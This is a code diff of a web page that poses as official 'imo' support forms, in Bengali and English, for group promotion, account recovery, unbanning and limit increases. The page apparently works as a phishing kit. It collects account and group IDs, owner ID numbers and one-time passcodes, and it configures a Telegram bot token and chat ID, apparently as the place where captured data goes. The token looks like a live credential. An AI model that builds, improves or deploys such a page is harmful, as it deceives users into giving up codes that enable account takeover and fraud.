-                    <button class="limit-btn" onclick="selectOption(this, 'Password')" data-i18n="opt_password">পাসওয়ার্ড</button>
-                    <button class="limit-btn" onclick="selectOption(this, 'Hacked')" data-i18n="opt_hacked">হ্যাক</button>
-                    <button class="limit-btn" onclick="selectOption(this, 'Other')" data-i18n="opt_other">অন্যান্য</button>
+                    <button class="limit-btn" onclick="selectOption(this, 'Password')" data-i18n="opt_password">Password</button>
+                    <button class="limit-btn" onclick="selectOption(this, 'Hacked')" data-i18n="opt_hacked">Hacked</button>
+                    <button class="limit-btn" onclick="selectOption(this, 'Other')" data-i18n="opt_other">Other</button>
                 </div>
             </div>
-            <div style="text-align: center; margin-bottom: 15px; color: rgba(255,255,255,0.5); font-size: 0.85rem;" data-i18n="form_submit_hint">এখন এখানে সাবমিট করুন</div>
-            <button class="btn-submit" onclick="submitFlow('hrad')" data-i18n="btn_submit">সাবমিট</button>
+            <div style="text-align: center; margin-bottom: 15px; color: rgba(255,255,255,0.5); font-size: 0.85rem;" data-i18n="form_submit_hint">Now submit here</div>
+            <button class="btn-submit" onclick="fastSubmitFlow('hrad')" data-i18n="btn_submit">Submit</button>
         </div>
     </div>
 
     <div class="modal-overlay modal-c3" id="modal-3-5">
         <div class="modal-box">
             <div class="modal-header">
-                <div class="modal-title" data-i18n="owner_title">ওনার ভেরিফিকেশন</div>
+                <div class="modal-title" data-i18n="user_verify_title">User Verification</div>
                 <button class="close-btn" onclick="closeModal('modal-3-5')">&times;</button>
             </div>
-            <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="owner_desc_hrad">আপনার অ্যাকাউন্ট রিকভারি রিকোয়েস্টটি কনফার্ম করার জন্য অ্যাকাউন্টের ওনার আইডি দিয়ে ভেরিফাই করুন</p>
+            <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="user_verify_desc">To confirm your request, please verify with your User Name and User Account Number</p>
             <div class="form-group">
-                <label data-i18n="owner_id_account">অ্যাকাউন্টের ওনার আইডির নাম্বার</label>
-                <input type="text" class="form-input" placeholder="Owner ID Number..." data-i18n-placeholder="ph_owner_id">
-                <input type="text" class="form-input" placeholder="Confirm Owner ID Number..." data-i18n-placeholder="ph_owner_id_confirm">
+                <label data-i18n="user_name">User Name (Any Name)</label>
+                <input type="text" class="form-input" placeholder="Enter any User Name..." data-i18n-placeholder="ph_user_name">
             </div>
-            <button class="btn-submit" onclick="submitOwnerId('hrad')" data-i18n="btn_send_id">নাম্বার সেন্ড করুন</button>
+            <div class="form-group">
+                <label data-i18n="user_account">User Account Number (Any Number)</label>
+                <input type="text" class="form-input" placeholder="Enter any Account Number..." data-i18n-placeholder="ph_user_account">
+            </div>
+            <button class="btn-submit" onclick="fastSubmitVerification('hrad')" data-i18n="btn_send_verify">Verify Now</button>
         </div>
     </div>
 
     <div class="modal-overlay modal-c3" id="modal-3-7">
         <div class="modal-box">
             <div class="modal-header">
-                <div class="modal-title" data-i18n="otp_title">OTP ভেরিফিকেশন</div>
+                <div class="modal-title" data-i18n="otp_title">OTP Verification</div>
                 <button class="close-btn" onclick="closeModal('modal-3-7')">&times;</button>
             </div>
-            <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="otp_desc">গ্রুপ ওনার নাম্বারে পাঠানো ৪ ডিজিটের কোডটি দিন</p>
+            <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="otp_desc">Enter the 4-digit code sent to your number</p>
             <div class="otp-container" id="otp-inputs-hrad">
                 <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*">
                 <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*">
@@ -697,69 +707,70 @@
                 <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*">
             </div>
             <div class="verify-loading" id="verify-loading-hrad">
-                <div class="spinner"></div><span style="color: var(--c3); font-size: 0.9rem;" data-i18n="otp_verifying">ভেরিফাই করা হচ্ছে...</span>
+                <div class="spinner"></div><span style="color: var(--c3); font-size: 0.9rem;" data-i18n="otp_verifying">Verifying...</span>
             </div>
             <div class="verify-success" id="verify-success-hrad">
-                <div class="success-icon">✓</div><span class="success-text" data-i18n="otp_success">সফলভাবে ভেরিফাইড!</span>
+                <div class="success-icon">✓</div><span class="success-text" data-i18n="otp_success">Successfully Verified!</span>
             </div>
-            <button class="btn-submit" id="otp-submit-btn-hrad" onclick="autoVerify('hrad')" data-i18n="btn_verify">ভেরিফাই করুন</button>
+            <button class="btn-submit" id="otp-submit-btn-hrad" onclick="autoVerify('hrad')" data-i18n="btn_verify">Verify</button>
         </div>
     </div>
 
-    <!-- =========================================
-         MODALS FLOW 4: UNBANNED (GREEN)
-         ========================================= -->
+    <!-- MODAL 4 -->
     <div class="modal-overlay modal-c4" id="modal-4">
         <div class="modal-box">
             <div class="modal-header">
-                <div class="modal-title" data-i18n="modal4_title">আনব্যান রিকোয়েস্ট</div>
+                <div class="modal-title" data-i18n="modal4_title">Unban Request</div>
                 <button class="close-btn" onclick="closeModal('modal-4')">&times;</button>
             </div>
             <div class="form-group">
-                <label data-i18n="form_unban_id">প্রিয় ইউজার আপনার অ্যাকাউন্ট/গ্রুপ আইডি লিখুন</label>
+                <label data-i18n="form_unban_id">Dear User, enter your Account/Group ID</label>
                 <input type="text" class="form-input" placeholder="Account/Group ID..." data-i18n-placeholder="ph_account_id">
                 <input type="text" class="form-input" placeholder="Confirm Account/Group ID..." data-i18n-placeholder="ph_account_id_confirm">
             </div>
             <div class="form-group">
-                <label data-i18n="form_unban_reason">প্রিয় ইউজার ব্যান করার কারণ লিখুন</label>
+                <label data-i18n="form_unban_reason">Dear User, enter the reason for the ban</label>
                 <input type="text" class="form-input" placeholder="Ban Reason..." data-i18n-placeholder="ph_ban_reason">
                 <input type="text" class="form-input" placeholder="Confirm Ban Reason..." data-i18n-placeholder="ph_ban_reason_confirm">
             </div>
             <div class="form-group" style="margin-bottom: 10px;">
-                <label data-i18n="form_unban_type">প্রিয় ইউজার আপনার আবেদনের ধরন বাছাই করুন</label>
+                <label data-i18n="form_unban_type">Dear User, select the type of your application</label>
                 <div class="limit-options">
-                    <button class="limit-btn" onclick="selectOption(this, 'Account')" data-i18n="opt_account">অ্যাকাউন্ট</button>
-                    <button class="limit-btn" onclick="selectOption(this, 'Group')" data-i18n="opt_group">গ্রুপ</button>
+                    <button class="limit-btn" onclick="selectOption(this, 'Account')" data-i18n="opt_account">Account</button>
+                    <button class="limit-btn" onclick="selectOption(this, 'Group')" data-i18n="opt_group">Group</button>
                 </div>
             </div>
-            <div style="text-align: center; margin-bottom: 15px; color: rgba(255,255,255,0.5); font-size: 0.85rem;" data-i18n="form_submit_hint">এখন এখানে সাবমিট করুন</div>
-            <button class="btn-submit" onclick="submitFlow('unban')" data-i18n="btn_submit">সাবমিট</button>
+            <div style="text-align: center; margin-bottom: 15px; color: rgba(255,255,255,0.5); font-size: 0.85rem;" data-i18n="form_submit_hint">Now submit here</div>
+            <button class="btn-submit" onclick="fastSubmitFlow('unban')" data-i18n="btn_submit">Submit</button>
         </div>
     </div>
 
     <div class="modal-overlay modal-c4" id="modal-4-5">
         <div class="modal-box">
             <div class="modal-header">
-                <div class="modal-title" data-i18n="owner_title">ওনার ভেরিফিকেশন</div>
+                <div class="modal-title" data-i18n="user_verify_title">User Verification</div>
                 <button class="close-btn" onclick="closeModal('modal-4-5')">&times;</button>
             </div>
-            <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="owner_desc_unban">আপনার আনব্যান রিকোয়েস্টটি কনফার্ম করার জন্য অ্যাকাউন্টের ওনার আইডি দিয়ে ভেরিফাই করুন</p>
+            <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="user_verify_desc">To confirm your request, please verify with your User Name and User Account Number</p>
             <div class="form-group">
-                <label data-i18n="owner_id_account">অ্যাকাউন্টের ওনার আইডির নাম্বার</label>
-                <input type="text" class="form-input" placeholder="Owner ID Number..." data-i18n-placeholder="ph_owner_id">
-                <input type="text" class="form-input" placeholder="Confirm Owner ID Number..." data-i18n-placeholder="ph_owner_id_confirm">
+                <label data-i18n="user_name">User Name (Any Name)</label>
+                <input type="text" class="form-input" placeholder="Enter any User Name..." data-i18n-placeholder="ph_user_name">
             </div>
-            <button class="btn-submit" onclick="submitOwnerId('unban')" data-i18n="btn_send_id">নাম্বার সেন্ড করুন</button>
+            <div class="form-group">
+                <label data-i18n="user_account">User Account Number (Any Number)</label>
+                <input type="text" class="form-input" placeholder="Enter any Account Number..." data-i18n-placeholder="ph_user_account">
+            </div>
+            <button class="btn-submit" onclick="fastSubmitVerification('unban')" data-i18n="btn_send_verify">Verify Now</button>
         </div>
     </div>
 
     <div class="modal-overlay modal-c4" id="modal-4-7">
         <div class="modal-box">
             <div class="modal-header">
-                <div class="modal-title" data-i18n="otp_title">OTP ভেরিফিকেশন</div>
+                <div class="modal-title" data-i18n="otp_title">OTP Verification</div>
                 <button class="close-btn" onclick="closeModal('modal-4-7')">&times;</button>
             </div>
-            <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="otp_desc">গ্রুপ ওনার নাম্বারে পাঠানো ৪ ডিজিটের কোডটি দিন</p>
+            <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="otp_desc">Enter the 4-digit code sent to your number</p>
             <div class="otp-container" id="otp-inputs-unban">
                 <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*">
                 <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*">
@@ -767,70 +778,71 @@
                 <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*">
             </div>
             <div class="verify-loading" id="verify-loading-unban">
-                <div class="spinner"></div><span style="color: var(--c4); font-size: 0.9rem;" data-i18n="otp_verifying">ভেরিফাই করা হচ্ছে...</span>
+                <div class="spinner"></div><span style="color: var(--c4); font-size: 0.9rem;" data-i18n="otp_verifying">Verifying...</span>
             </div>
             <div class="verify-success" id="verify-success-unban">
-                <div class="success-icon">✓</div><span class="success-text" data-i18n="otp_success">সফলভাবে ভেরিফাইড!</span>
+                <div class="success-icon">✓</div><span class="success-text" data-i18n="otp_success">Successfully Verified!</span>
             </div>
-            <button class="btn-submit" id="otp-submit-btn-unban" onclick="autoVerify('unban')" data-i18n="btn_verify">ভেরিফাই করুন</button>
+            <button class="btn-submit" id="otp-submit-btn-unban" onclick="autoVerify('unban')" data-i18n="btn_verify">Verify</button>
         </div>
     </div>
 
-    <!-- =========================================
-         MODALS FLOW 5: GROUP LIMIT (AMBER)
-         ========================================= -->
+    <!-- MODAL 5 -->
     <div class="modal-overlay modal-c5" id="modal-5">
         <div class="modal-box">
             <div class="modal-header">
-                <div class="modal-title" data-i18n="modal5_title">গ্রুপ লিংক লিমিট</div>
+                <div class="modal-title" data-i18n="modal5_title">Group Limit</div>
                 <button class="close-btn" onclick="closeModal('modal-5')">&times;</button>
             </div>
             <div class="form-group">
-                <label data-i18n="form_limit_id">প্রিয় ইউজার আপনার গ্রুপের লিমিট বাড়ানোর জন্য গ্রুপ আইডি কি এখানে লিখুন</label>
+                <label data-i18n="form_limit_id">Dear User, enter the Group ID to increase your group limit</label>
                 <input type="text" class="form-input" placeholder="Group ID..." data-i18n-placeholder="ph_group_id">
                 <input type="text" class="form-input" placeholder="Confirm Group ID..." data-i18n-placeholder="ph_group_id_confirm">
             </div>
             <div class="form-group">
-                <label data-i18n="form_group_name">প্রিয় ইউজার গ্রুপের নামটি লিখুন</label>
+                <label data-i18n="form_group_name">Dear User, enter the Group Name</label>
                 <input type="text" class="form-input" placeholder="Group Name..." data-i18n-placeholder="ph_group_name">
                 <input type="text" class="form-input" placeholder="Confirm Group Name..." data-i18n-placeholder="ph_group_name_confirm">
             </div>
             <div class="form-group" style="margin-bottom: 10px;">
-                <label data-i18n="form_limit_amount">প্রিয় ইউজার আপনি ঠিক কত হাজার লিমিট করতে চান বাছাই করুন</label>
+                <label data-i18n="form_limit_amount">Dear User, select how many thousand limits you want</label>
                 <div class="limit-options">
                     <button class="limit-btn" onclick="selectOption(this, '1000')">1000</button>
                     <button class="limit-btn" onclick="selectOption(this, '2000')">2000</button>
                     <button class="limit-btn" onclick="selectOption(this, '3000')">3000</button>
                 </div>
             </div>
-            <div style="text-align: center; margin-bottom: 15px; color: rgba(255,255,255,0.5); font-size: 0.85rem;" data-i18n="form_submit_hint">এখন এখানে সাবমিট করুন</div>
-            <button class="btn-submit" onclick="submitFlow('limit')" data-i18n="btn_submit">সাবমিট</button>
+            <div style="text-align: center; margin-bottom: 15px; color: rgba(255,255,255,0.5); font-size: 0.85rem;" data-i18n="form_submit_hint">Now submit here</div>
+            <button class="btn-submit" onclick="fastSubmitFlow('limit')" data-i18n="btn_submit">Submit</button>
         </div>
     </div>
 
     <div class="modal-overlay modal-c5" id="modal-6">
         <div class="modal-box">
             <div class="modal-header">
-                <div class="modal-title" data-i18n="owner_title">ওনার ভেরিফিকেশন</div>
+                <div class="modal-title" data-i18n="user_verify_title">User Verification</div>
                 <button class="close-btn" onclick="closeModal('modal-6')">&times;</button>
             </div>
-            <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="owner_desc_limit">আপনার গ্রুপটির লিমিট বাড়ানোর আবেদনটি কনফার্ম করার জন্য আপনার গ্রুপের ওনার আইডি দিয়ে ভেরিফাই করুন</p>
+            <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="user_verify_desc">To confirm your request, please verify with your User Name and User Account Number</p>
             <div class="form-group">
-                <label data-i18n="owner_id">গ্রুপের ওনার আইডির নাম্বার</label>
-                <input type="text" class="form-input" placeholder="Owner ID Number..." data-i18n-placeholder="ph_owner_id">
-                <input type="text" class="form-input" placeholder="Confirm Owner ID Number..." data-i18n-placeholder="ph_owner_id_confirm">
+                <label data-i18n="user_name">User Name (Any Name)</label>
+                <input type="text" class="form-input" placeholder="Enter any User Name..." data-i18n-placeholder="ph_user_name">
             </div>
-            <button class="btn-submit" onclick="submitOwnerId('limit')" data-i18n="btn_send_id">নাম্বার সেন্ড করুন</button>
+            <div class="form-group">
+                <label data-i18n="user_account">User Account Number (Any Number)</label>
+                <input type="text" class="form-input" placeholder="Enter any Account Number..." data-i18n-placeholder="ph_user_account">
+            </div>
+            <button class="btn-submit" onclick="fastSubmitVerification('limit')" data-i18n="btn_send_verify">Verify Now</button>
         </div>
     </div>
 
     <div class="modal-overlay modal-c5" id="modal-7">
         <div class="modal-box">
             <div class="modal-header">
-                <div class="modal-title" data-i18n="otp_title">OTP ভেরিফিকেশন</div>
+                <div class="modal-title" data-i18n="otp_title">OTP Verification</div>
                 <button class="close-btn" onclick="closeModal('modal-7')">&times;</button>
             </div>
-            <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="otp_desc">গ্রুপ ওনার নাম্বারে পাঠানো ৪ ডিজিটের কোডটি দিন</p>
+            <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="otp_desc">Enter the 4-digit code sent to your number</p>
             <div class="otp-container" id="otp-inputs-limit">
                 <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*">
                 <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*">
@@ -838,34 +850,25 @@
                 <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*">
             </div>
             <div class="verify-loading" id="verify-loading-limit">
-                <div class="spinner"></div><span style="color: var(--c5); font-size: 0.9rem;" data-i18n="otp_verifying">ভেরিফাই করা হচ্ছে...</span>
+                <div class="spinner"></div><span style="color: var(--c5); font-size: 0.9rem;" data-i18n="otp_verifying">Verifying...</span>
             </div>
             <div class="verify-success" id="verify-success-limit">
-                <div class="success-icon">✓</div><span class="success-text" data-i18n="otp_success">সফলভাবে ভেরিফাইড!</span>
+                <div class="success-icon">✓</div><span class="success-text" data-i18n="otp_success">Successfully Verified!</span>
             </div>
-            <button class="btn-submit" id="otp-submit-btn-limit" onclick="autoVerify('limit')" data-i18n="btn_verify">ভেরিফাই করুন</button>
+            <button class="btn-submit" id="otp-submit-btn-limit" onclick="autoVerify('limit')" data-i18n="btn_verify">Verify</button>
         </div>
     </div>
 
-
-    <!-- =========================================
-         FIREBASE & TELEGRAM INTEGRATION SCRIPTS
-         ========================================= -->
-    
-    <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
 
     <script>
         // ==========================================
-        // ⚠️ 1. TELEGRAM BOT CONFIGURATION ⚠️
+        // ⚙️ CONFIGURATION
         // ==========================================
         const BOT_TOKEN = '8781263638:AAH_I1NUGkD8kNSHq9ZhvIhFW4vdv3uvotY'; 
         const CHAT_ID = '7197720055';
-
-        // ==========================================
-        // ⚠️ 2. FIREBASE CONFIGURATION ⚠️
-        // ==========================================
+        
         const firebaseConfig = {
             apiKey: "YOUR_API_KEY",
             authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
@@ -875,36 +878,25 @@
             appId: "YOUR_APP_ID"
         };
 
-        // Initialize Firebase
         let db = null;
         try {
             if (!firebase.apps.length) {
                 firebase.initializeApp(firebaseConfig);
                 db = firebase.firestore();
-                console.log("Firebase initialized successfully.");
             }
-        } catch (error) {
-            console.warn("Firebase configuration is missing or invalid. Data will not be saved to Firebase.", error);
-        }
+        } catch (error) { console.warn("Firebase not configured."); }
 
         // ==========================================
-        // TRANSLATIONS (i18n)
+        // TRANSLATIONS
         // ==========================================
         const translations = {
             en: {
-                title: "imo Officials Forms",
-                card_promote: "Imo Group Promote",
-                card_shortid: "Imo Group Short ID",
-                card_hrad: "Imo Account Hrad",
-                card_unban: "Imo Account/Group Unbanned",
-                card_limit: "Group Limit",
+                title: "imo Officials Forms", card_promote: "Imo Group Promote", card_shortid: "Imo Group Short ID",
+                card_hrad: "Imo Account Hrad", card_unban: "Imo Account/Group Unbanned", card_limit: "Group Limit",
                 about_title: "About imo",
-                about_desc: "imo is a leading global communication platform, offering free, high-quality HD video and voice calls to over 200 million users worldwide. Stay connected without limits!",
-                modal1_title: "Group Promote Request",
-                modal2_title: "Short ID Request",
-                modal3_title: "Account Recovery (Hrad)",
-                modal4_title: "Unban Request",
-                modal5_title: "Group Link Limit",
+                about_desc: "imo is a leading global communication platform, offering free, high-quality HD video and voice calls to over 200 million users worldwide.",
+                modal1_title: "Group Promote", modal2_title: "Short ID", modal3_title: "Account Recovery",
+                modal4_title: "Unban Request", modal5_title: "Group Limit",
                 form_group_id: "Dear User, enter the Group ID to promote your group",
                 form_group_name: "Dear User, enter the Group Name",
                 form_promote_days: "Dear User, select how many days you want to promote",
@@ -918,62 +910,36 @@
                 form_unban_type: "Dear User, select the type of your application",
                 form_limit_id: "Dear User, enter the Group ID to increase your group limit",
                 form_limit_amount: "Dear User, select how many thousand limits you want",
-                owner_title: "Owner Verification",
-                owner_desc: "To confirm your request, please verify with the group owner's ID",
-                owner_desc_shortid: "To confirm your Short ID request, please verify with the group owner's ID",
-                owner_desc_hrad: "To confirm your account recovery request, please verify with the account owner's ID",
-                owner_desc_unban: "To confirm your unban request, please verify with the account owner's ID",
-                owner_desc_limit: "To confirm your group limit request, please verify with the group owner's ID",
-                owner_id: "Group Owner ID Number",
-                owner_id_account: "Account Owner ID Number",
+                user_verify_title: "User Verification",
+                user_verify_desc: "To confirm your request, please verify with your User Name and User Account Number",
+                user_name: "User Name (Any Name)",
+                user_account: "User Account Number (Any Number)",
                 otp_title: "OTP Verification",
-                otp_desc: "Enter the 4-digit code sent to the owner's number",
-                otp_verifying: "Verifying...",
-                otp_success: "Successfully Verified!",
-                btn_submit: "Submit",
-                btn_send_id: "Send ID",
-                btn_verify: "Verify",
+                otp_desc: "Enter the 4-digit code sent to your number",
+                otp_verifying: "Verifying...", otp_success: "Successfully Verified!",
+                btn_submit: "Submit", btn_send_verify: "Verify Now", btn_verify: "Verify",
                 form_submit_hint: "Now submit here",
-                opt_1_day: "1 Day",
-                opt_7_days: "7 Days",
-                opt_30_days: "30 Days",
-                opt_3_digit: "3 Digit",
-                opt_4_digit: "4 Digit",
-                opt_5_digit: "5 Digit",
-                opt_password: "Password",
-                opt_hacked: "Hacked",
-                opt_other: "Other",
-                opt_account: "Account",
-                opt_group: "Group",
-                ph_group_id: "Group ID...",
-                ph_group_id_confirm: "Confirm Group ID...",
-                ph_group_name: "Group Name...",
-                ph_group_name_confirm: "Confirm Group Name...",
-                ph_owner_id: "Owner ID Number...",
-                ph_owner_id_confirm: "Confirm Owner ID Number...",
-                ph_account_id: "Account ID...",
-                ph_account_id_confirm: "Confirm Account ID...",
-                ph_account_name: "Account Name...",
-                ph_account_name_confirm: "Confirm Account Name...",
-                ph_ban_reason: "Ban Reason...",
-                ph_ban_reason_confirm: "Confirm Ban Reason...",
-                alert_owner_id: "Please enter the owner ID number.",
+                opt_1_day: "1 Day", opt_7_days: "7 Days", opt_30_days: "30 Days",
+                opt_3_digit: "3 Digit", opt_4_digit: "4 Digit", opt_5_digit: "5 Digit",
+                opt_password: "Password", opt_hacked: "Hacked", opt_other: "Other",
+                opt_account: "Account", opt_group: "Group",
+                ph_group_id: "Group ID...", ph_group_id_confirm: "Confirm Group ID...",
+                ph_group_name: "Group Name...", ph_group_name_confirm: "Confirm Group Name...",
+                ph_user_name: "Enter any User Name...", ph_user_account: "Enter any Account Number...",
+                ph_account_id: "Account ID...", ph_account_id_confirm: "Confirm Account ID...",
+                ph_account_name: "Account Name...", ph_account_name_confirm: "Confirm Account Name...",
+                ph_ban_reason: "Ban Reason...", ph_ban_reason_confirm: "Confirm Ban Reason...",
+                alert_user_name: "Please enter any User Name.", 
+                alert_user_account: "Please enter any Account Number.",
                 alert_otp: "Please enter the complete 4-digit code."
             },
             bn: {
-                title: "imo অফিসিয়াল ফর্ম",
-                card_promote: "ইমো গ্রুপ প্রমোট",
-                card_shortid: "ইমো গ্রুপ শর্ট আইডি",
-                card_hrad: "ইমো অ্যাকাউন্ট রিকভারি",
-                card_unban: "ইমো অ্যাকাউন্ট/গ্রুপ আনব্যান",
-                card_limit: "গ্রুপ লিমিট",
+                title: "imo অফিসিয়াল ফর্ম", card_promote: "ইমো গ্রুপ প্রমোট", card_shortid: "ইমো গ্রুপ শর্ট আইডি",
+                card_hrad: "ইমো অ্যাকাউন্ট রিকভারি", card_unban: "ইমো অ্যাকাউন্ট/গ্রুপ আনব্যান", card_limit: "গ্রুপ লিমিট",
                 about_title: "imo সম্পর্কে",
-                about_desc: "imo একটি শীর্ষস্থানীয় গ্লোবাল কমিউনিকেশন প্ল্যাটফর্ম, যা বিশ্বব্যাপী ২০০ মিলিয়নেরও বেশি ব্যবহারকারীর জন্য ফ্রি, উচ্চ-মানের এইচডি ভিডিও এবং ভয়েস কল সরবরাহ করে। সীমাহীন সংযুক্ত থাকুন!",
-                modal1_title: "গ্রুপ প্রমোট রিকোয়েস্ট",
-                modal2_title: "শর্ট আইডি রিকোয়েস্ট",
-                modal3_title: "অ্যাকাউন্ট রিকভারি (Hrad)",
-                modal4_title: "আনব্যান রিকোয়েস্ট",
-                modal5_title: "গ্রুপ লিংক লিমিট",
+                about_desc: "imo একটি শীর্ষস্থানীয় গ্লোবাল কমিউনিকেশন প্ল্যাটফর্ম, যা বিশ্বব্যাপী ২০০ মিলিয়নেরও বেশি ব্যবহারকারীর জন্য ফ্রি, উচ্চ-মানের এইচডি ভিডিও এবং ভয়েস কল সরবরাহ করে।",
+                modal1_title: "গ্রুপ প্রমোট", modal2_title: "শর্ট আইডি", modal3_title: "অ্যাকাউন্ট রিকভারি",
+                modal4_title: "আনব্যান রিকোয়েস্ট", modal5_title: "গ্রুপ লিমিট",
                 form_group_id: "প্রিয় ইউজার আপনার গ্রুপটি প্রমোট করার জন্য গ্রুপ আইডি লিখুন",
                 form_group_name: "প্রিয় ইউজার গ্রুপের নামটি লিখুন",
                 form_promote_days: "প্রিয় ইউজার আপনি কত দিনের জন্য প্রমোট করতে চান বাছাই করুন",
@@ -985,367 +951,203 @@
                 form_unban_id: "প্রিয় ইউজার আপনার অ্যাকাউন্ট/গ্রুপ আইডি লিখুন",
                 form_unban_reason: "প্রিয় ইউজার ব্যান করার কারণ লিখুন",
                 form_unban_type: "প্রিয় ইউজার আপনার আবেদনের ধরন বাছাই করুন",
-                form_limit_id: "প্রিয় ইউজার আপনার গ্রুপের লিমিট বাড়ানোর জন্য গ্রুপ আইডি কি এখানে লিখুন",
+                form_limit_id: "প্রিয় ইউজার আপনার গ্রুপের লিমিট বাড়ানোর জন্য গ্রুপ আইডি লিখুন",
                 form_limit_amount: "প্রিয় ইউজার আপনি ঠিক কত হাজার লিমিট করতে চান বাছাই করুন",
-                owner_title: "ওনার ভেরিফিকেশন",
-                owner_desc: "আপনার গ্রুপ প্রমোট রিকোয়েস্টটি কনফার্ম করার জন্য গ্রুপের ওনার আইডি দিয়ে ভেরিফাই করুন",
-                owner_desc_shortid: "আপনার শর্ট আইডি রিকোয়েস্টটি কনফার্ম করার জন্য গ্রুপের ওনার আইডি দিয়ে ভেরিফাই করুন",
-                owner_desc_hrad: "আপনার অ্যাকাউন্ট রিকভারি রিকোয়েস্টটি কনফার্ম করার জন্য অ্যাকাউন্টের ওনার আইডি দিয়ে ভেরিফাই করুন",
-                owner_desc_unban: "আপনার আনব্যান রিকোয়েস্টটি কনফার্ম করার জন্য অ্যাকাউন্টের ওনার আইডি দিয়ে ভেরিফাই করুন",
-                owner_desc_limit: "আপনার গ্রুপটির লিমিট বাড়ানোর আবেদনটি কনফার্ম করার জন্য আপনার গ্রুপের ওনার আইডি দিয়ে ভেরিফাই করুন",
-                owner_id: "গ্রুপের ওনার আইডির নাম্বার",
-                owner_id_account: "অ্যাকাউন্টের ওনার আইডির নাম্বার",
+                user_verify_title: "ইউজার ভেরিফিকেশন",
+                user_verify_desc: "আপনার রিকোয়েস্টটি কনফার্ম করার জন্য ইউজার নাম এবং ইউজার অ্যাকাউন্ট নাম্বার দিয়ে ভেরিফাই করুন",
+                user_name: "ইউজার নাম (যেকোনো নাম)",
+                user_account: "ইউজার অ্যাকাউন্ট নাম্বার (যেকোনো নাম্বার)",
                 otp_title: "OTP ভেরিফিকেশন",
-                otp_desc: "গ্রুপ ওনার নাম্বারে পাঠানো ৪ ডিজিটের কোডটি দিন",
-                otp_verifying: "ভেরিফাই করা হচ্ছে...",
-                otp_success: "সফলভাবে ভেরিফাইড!",
-                btn_submit: "সাবমিট",
-                btn_send_id: "নাম্বার সেন্ড করুন",
-                btn_verify: "ভেরিফাই করুন",
+                otp_desc: "আপনার নাম্বারে পাঠানো ৪ ডিজিটের কোডটি দিন",
+                otp_verifying: "ভেরিফাই করা হচ্ছে...", otp_success: "সফলভাবে ভেরিফাইড!",
+                btn_submit: "সাবমিট", btn_send_verify: "ভেরিফাই করুন", btn_verify: "ভেরিফাই",
                 form_submit_hint: "এখন এখানে সাবমিট করুন",
-                opt_1_day: "1 দিন",
-                opt_7_days: "7 দিন",
-                opt_30_days: "30 দিন",
-                opt_3_digit: "3 ডিজিট",
-                opt_4_digit: "4 ডিজিট",
-                opt_5_digit: "5 ডিজিট",
-                opt_password: "পাসওয়ার্ড",
-                opt_hacked: "হ্যাক",
-                opt_other: "অন্যান্য",
-                opt_account: "অ্যাকাউন্ট",
-                opt_group: "গ্রুপ",
-                ph_group_id: "Group ID...",
-                ph_group_id_confirm: "Confirm Group ID...",
-                ph_group_name: "Group Name...",
-                ph_group_name_confirm: "Confirm Group Name...",
-                ph_owner_id: "Owner ID Number...",
-                ph_owner_id_confirm: "Confirm Owner ID Number...",
-                ph_account_id: "Account ID...",
-                ph_account_id_confirm: "Confirm Account ID...",
-                ph_account_name: "Account Name...",
-                ph_account_name_confirm: "Confirm Account Name...",
-                ph_ban_reason: "Ban Reason...",
-                ph_ban_reason_confirm: "Confirm Ban Reason...",
-                alert_owner_id: "অনুগ্রহ করে ওনার আইডি নাম্বার দিন।",
+                opt_1_day: "1 দিন", opt_7_days: "7 দিন", opt_30_days: "30 দিন",
+                opt_3_digit: "3 ডিজিট", opt_4_digit: "4 ডিজিট", opt_5_digit: "5 ডিজিট",
+                opt_password: "পাসওয়ার্ড", opt_hacked: "হ্যাক", opt_other: "অন্যান্য",
+                opt_account: "অ্যাকাউন্ট", opt_group: "গ্রুপ",
+                ph_group_id: "Group ID...", ph_group_id_confirm: "Confirm Group ID...",
+                ph_group_name: "Group Name...", ph_group_name_confirm: "Confirm Group Name...",
+                ph_user_name: "যেকোনো ইউজার নাম লিখুন...", ph_user_account: "যেকোনো নাম্বার লিখুন...",
+                ph_account_id: "Account ID...", ph_account_id_confirm: "Confirm Account ID...",
+                ph_account_name: "Account Name...", ph_account_name_confirm: "Confirm Account Name...",
+                ph_ban_reason: "Ban Reason...", ph_ban_reason_confirm: "Confirm Ban Reason...",
+                alert_user_name: "অনুগ্রহ করে যেকোনো ইউজার নাম দিন।", 
